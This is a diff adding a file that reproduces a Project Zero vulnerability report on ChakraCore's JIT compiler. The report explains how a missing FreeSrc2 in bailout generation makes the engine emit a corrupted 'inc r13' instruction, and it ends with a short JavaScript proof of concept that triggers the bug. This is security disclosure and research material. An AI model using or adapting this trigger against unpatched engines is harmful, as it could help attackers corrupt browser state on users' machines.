@@ -1,0 +1,88 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1333
+
+Bailout:
+"ChakraCore’s background JIT compiler generates highly optimized JIT’ed code based upon the data and infers likely usage patterns based on the profile data collected by the interpreter. Given the dynamic nature of JavaScript code, if the code gets executed in a way that breaks the profile assumptions, the JIT’ed code “bails out” to the interpreter where the slower bytecode execution restarts while continuing to collect more profile data."
+
+From https://github.com/Microsoft/ChakraCore/wiki/Architecture-Overview
+
+
+
+One of the ways to generate bailouts in Chakra is to directly change the opcode of an instruction that can't be JITed. This is performed by the method "Lowerer::GenerateBailOut".
+
+
+Here's a snippet of Lowerer::GenerateBailOut.
+    ...
+    // Call the bail out wrapper
+    instr->m_opcode = Js::OpCode::Call;
+    if(instr->GetDst())
+    {
+        // To facilitate register allocation, don't assign a destination. The result will anyway go into the return register,
+        // but the register allocator does not need to kill that register for the call.
+        instr->FreeDst();
+    }
+    instr->SetSrc1(IR::HelperCallOpnd::New(helperMethod, this->m_func));
+    m_lowererMD.LowerCall(instr, 0);
+
+Here's some calling patterns of the method.
+
+1.
+instr->FreeSrc1();
+instr->FreeSrc2();
+this->GenerateBailOut(instr);
+
+2.
+stElem->FreeSrc1();
+stElem->FreeDst();
+GenerateBailOut(stElem, nullptr, nullptr);
+
+Judging from the method code that doesn't care about "Src2" and the calling patterns, freeing or unlinking "Src1" and "Src2" is up to the callers. I could spot some points that don't free or unlink an instuction's "Src2", despite the instruction has "Src2". In these cases, it ends up to be converted to "Js::OpCode::Call" with "Src2". So, what happens if a Call instruction has "Src2"?
+
+Here's the trace log of the PoC.
+$L13: [helper]
+                                                                                
+    s51<-48>        =  MOV            s51(r13)                                  4C 89 6D D0 
+    (rdi).u64       =  MOV            0xXXXXXXXX (BailOutRecord).u64            48 BF 78 23 00 7C 17 7F 00 00 
+    (rax).u64       =  MOV            SaveAllRegistersAndBailOut.u64            48 B8 20 92 19 93 1F 7F 00 00 
+                       CALL           (rax).u64, s51(r13)                       49 FF C5 
+                       JMP            $L14                                      E9 00 00 00 00 
+                       StatementBoundary  #-1                                   
+
+
+"CALL  (rax).u64, s51(r13)" is what Chakra wanted to generate(despite CALLs don't take the second operand). "49 FF C5" is x86-64 code actually generated and disassembled as "inc r13". This also means there's a bug in the x86-64 assembler.
+
+
+PoC bug:
+The following buggy method is used to convert a St*Fld instruction to a bailout. Unlike just "StFld" instructions, "StSuperFld" instructions take "Src2" as "this". So the following method should have freed "Src2".
+
+bool
+Lowerer::GenerateStFldWithCachedType(IR::Instr *instrStFld, bool* continueAsHelperOut, IR::LabelInstr** labelHelperOut, IR::RegOpnd** typeOpndOut)
+{
+    ...
+        instrStFld->m_opcode = Js::OpCode::BailOut;
+        instrStFld->FreeSrc1();
+        <<----------- should call FreeSrc2
+        instrStFld->FreeDst();
+
+        this->GenerateBailOut(instrStFld);
+    ...
+}
+
+PoC:
+*/
+
+class MyClass {
+    constructor() {
+        this.arr = [1, 2, 3];
+    }
+
+    f() {
+        super.arr = [1];
+        this.x;  // for passing BackwardPass::DeadStoreTypeCheckBailOut ?
+    }
+}
+
+let c = new MyClass();
+for (let i = 0; i < 0x10000; i++) {
+    c.f();
+}
